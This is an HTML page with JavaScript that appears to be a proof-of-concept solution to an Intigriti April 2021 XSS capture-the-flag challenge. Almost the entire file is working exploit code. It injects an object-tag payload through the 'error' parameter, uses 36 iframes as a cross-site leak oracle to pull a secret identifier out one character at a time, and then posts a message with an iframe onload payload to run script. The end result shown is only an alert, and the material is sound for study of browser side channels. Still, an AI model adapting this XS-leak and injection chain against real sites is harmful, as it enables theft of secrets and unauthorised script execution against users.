<html>

<head>
    <meta charset="utf-8">
</head>
    
<body>
    <!-- put style.css into cache so 36 iframes load faster -->
    <iframe src="//challenge-0421.intigriti.io/style.css" onload=start()></iframe>
<script>

// The idea is to create an oracle with onSMTH that can be repeated over and over
// I used <object onload=> that can be repeated over and over because it triggers
// With every request. When the comparision is true, iframe.location++ is called
// which when same-origin will change the location. that is one of the possible
// xs-leaks of each character. there are probably plenty more solutions to leak
// the identifier though.

const top_url = '//challenge-0421.intigriti.io/?error=' + encodeURIComponent(`<object name=x data=${location.href}></object><object data=//${location.host}/empty.html name=lload onload=/##/.source+identifier<location.hash+/0/.source&&!top.x.i_0.name++&&x.x.x,/##/.source+identifier<location.hash+/1/.source&&!top.x.i_1.name++&&x.x.x,/##/.source+identifier<location.hash+/2/.source&&!top.x.i_2.name++&&x.x.x,/##/.source+identifier<location.hash+/3/.source&&!top.x.i_3.name++&&x.x.x,/##/.source+identifier<location.hash+/4/.source&&!top.x.i_4.name++&&x.x.x,/##/.source+identifier<location.hash+/5/.source&&!top.x.i_5.name++&&x.x.x,/##/.source+identifier<location.hash+/6/.source&&!top.x.i_6.name++&&x.x.x,/##/.source+identifier<location.hash+/7/.source&&!top.x.i_7.name++&&x.x.x,/##/.source+identifier<location.hash+/8/.source&&!top.x.i_8.name++&&x.x.x,/##/.source+identifier<location.hash+/9/.source&&!top.x.i_9.name++&&x.x.x,/##/.source+identifier<location.hash+/a/.source&&!top.x.i_a.name++&&x.x.x,/##/.source+identifier<location.hash+/b/.source&&!top.x.i_b.name++&&x.x.x,/##/.source+identifier<location.hash+/c/.source&&!top.x.i_c.name++&&x.x.x,/##/.source+identifier<location.hash+/d/.source&&!top.x.i_d.name++&&x.x.x,/##/.source+identifier<location.hash+/e/.source&&!top.x.i_e.name++&&x.x.x,/##/.source+identifier<location.hash+/f/.source&&!top.x.i_f.name++&&x.x.x,/##/.source+identifier<location.hash+/g/.source&&!top.x.i_g.name++&&x.x.x,/##/.source+identifier<location.hash+/h/.source&&!top.x.i_h.name++&&x.x.x,/##/.source+identifier<location.hash+/i/.source&&!top.x.i_i.name++&&x.x.x,/##/.source+identifier<location.hash+/j/.source&&!top.x.i_j.name++&&x.x.x,/##/.source+identifier<location.hash+/k/.source&&!top.x.i_k.name++&&x.x.x,/##/.source+identifier<location.hash+/l/.source&&!top.x.i_l.name++&&x.x.x,/##/.source+identifier<location.hash+/m/.source&&!top.x.i_m.name++&&x.x.x,/##/.source+identifier<location.hash+/n/.source&&!top.x.i_n.name++&&x.x.x,/##/.source+identifier<location.hash+/o/.source&&!top.x.i_o.name++&&x.x.x,/##/.source+identifier<location.hash+/p/.source&&!top.x.i_p.name++&&x.x.x,/##/.source+identifier<location.hash+/q/.source&&!top.x.i_q.name++&&x.x.x,/##/.source+identifier<location.hash+/r/.source&&!top.x.i_r.name++&&x.x.x,/##/.source+identifier<location.hash+/s/.source&&!top.x.i_s.name++&&x.x.x,/##/.source+identifier<location.hash+/t/.source&&!top.x.i_t.name++&&x.x.x,/##/.source+identifier<location.hash+/u/.source&&!top.x.i_u.name++&&x.x.x,/##/.source+identifier<location.hash+/v/.source&&!top.x.i_v.name++&&x.x.x,/##/.source+identifier<location.hash+/w/.source&&!top.x.i_w.name++&&x.x.x,/##/.source+identifier<location.hash+/x/.source&&!top.x.i_x.name++&&x.x.x,/##/.source+identifier<location.hash+/y/.source&&!top.x.i_y.name++&&x.x.x,/##/.source+identifier<location.hash+/z/.source&&!top.x.i_z.name++&&x.x.x,/##/.source+identifier<location.hash+/~/.source&&!top.x.i_zz.name++></object>`);

if(top !== window){
    top.location = top_url + '##'
}


let identifier = '';

const alph = "0123456789abcdefghijklmnopqrstuvwxyz~"
let iframes_counter = 0;

const IFRAMES = {} 

let block = false;
let INTERVAL;

const startTime = Date.now();
// name++ is a little bit faster than location++, because we can force cached style.css resource
// instead /NaN
function watchIframeDisappear(){
    if(block) return;
    for(let c of alph){
        let iname='i_'+(c==='~'?'zz':c);
        try{
            // iframe is still here
            window[iname].location
        }catch(e){
            // iframe disappeared
            console.log(iname, performance.now());
            block = true;
            IFRAMES[iname].remove();
            let iframe = document.createElement('iframe');
            iframe.name='i_'+(c==='~'?'zz':c);
            iframe.src = '//challenge-0421.intigriti.io/style.css'
            document.body.appendChild(iframe);
            IFRAMES[iname] = iframe;
            iframe.onload = () => {   
                block = false;
                new_char(alph[alph.search(c)-1]);
            }
            return; 
        }
    }
}

// Insert all the iframes to leak character by character, use favicon to load 
// them quickly from cache
function start(){
    for(let c of alph){
        let iframe = document.createElement('iframe');
        let iname = 'i_'+(c==='~'?'zz':c);
        iframe.name=iname;
        iframe.src = '//challenge-0421.intigriti.io/style.css'
        document.body.appendChild(iframe);
        IFRAMES[iname] = iframe;
        // wait for all iframes to load
        iframe.onload=()=>{
            if(!iframe.loaded){
                iframe.loaded = 1;
                iframes_counter++;
                if(iframes_counter === alph.length){
                    allIframesLoaded();
                }
            }
        }
    }
}

function new_char(c){
    if(c === undefined) {
        solve(identifier);
        return;
    }
    identifier += c;
    console.log(identifier);
    top.location = top_url + '##' + identifier;
    top.lload.location=URL.createObjectURL(new Blob([], {type: 'text/html'}));
}

// once the identifier is leaked, use it to trigger full blown XSS
function solve(identifier){
    clearInterval(INTERVAL);
    const pocTime = ((Date.now() - startTime)/1000).toFixed(2);
    top.postMessage({
        type: 'waf',
        identifier,
        str: `<iframe onload="alert(\`Thanks for playing! \n ~terjanq \n\nPoC time: ${pocTime}s\`)"></iframe>`,
        safe: true
    },'*')

}

function allIframesLoaded(){
    INTERVAL = setInterval(watchIframeDisappear, 10);
    top.lload.location=URL.createObjectURL(new Blob([], {type: 'text/html'}));
}


</script>
</body></html>